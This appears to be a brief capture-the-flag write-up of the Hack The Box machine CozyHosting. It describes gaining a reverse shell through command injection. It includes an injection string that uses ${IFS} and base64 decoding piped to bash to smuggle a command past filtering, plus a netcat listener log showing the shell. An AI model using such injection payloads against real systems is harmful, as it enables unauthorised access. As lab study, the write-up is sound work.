# Explanation
After finding out that I could do command injection, I proceeded forward by putting in a shellcode and see if I get a reverse shell using the following command.`;echo${IFS}"[payload]"|base64${IFS}-d|bash;` and I encoded the command into base 64 and ran the command which then gave me a shell.

# Encoding
![[Pasted image 20230905212157.png]]

# Command Injection
![[Pasted image 20230905212251.png]]

# Shell
```
┌──(root㉿kali)-[~/Documents/Notes/hackthebox/CozyHosting]
└─# nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.16.2] from (UNKNOWN) [10.129.105.21] 51232
bash: cannot set terminal process group (989): Inappropriate ioctl for device
bash: no job control in this shell
app@cozyhosting:/app$ whoami
whoami
app
app@cozyhosting:/app$ hostname
hostname
cozyhosting
app@cozyhosting:/app$ 
```